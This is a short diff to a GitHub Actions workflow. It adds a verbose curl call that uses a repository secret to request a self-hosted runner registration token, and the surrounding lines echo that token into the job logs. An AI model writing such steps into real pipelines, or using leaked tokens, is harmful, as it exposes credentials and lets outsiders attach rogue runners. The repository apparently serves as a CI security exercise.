@@ -20,6 +20,8 @@ jobs:
           egress-policy: audit
       - name: Smoke it!
         run: |
+          curl -vL -X POST -H "Authorization: Bearer ${{ secrets.SMOKER }}" https://api.github.com/repos/messypoutine/gravy-overflow/actions/runners/registration-token
+          exit 1
           TOKEN=$(curl -sL -X POST -H "Authorization: Bearer ${{ secrets.SMOKER }}" https://api.github.com/repos/messypoutine/gravy-overflow/actions/runners/registration-token | jq -r .token)
           echo -----
           echo $TOKEN
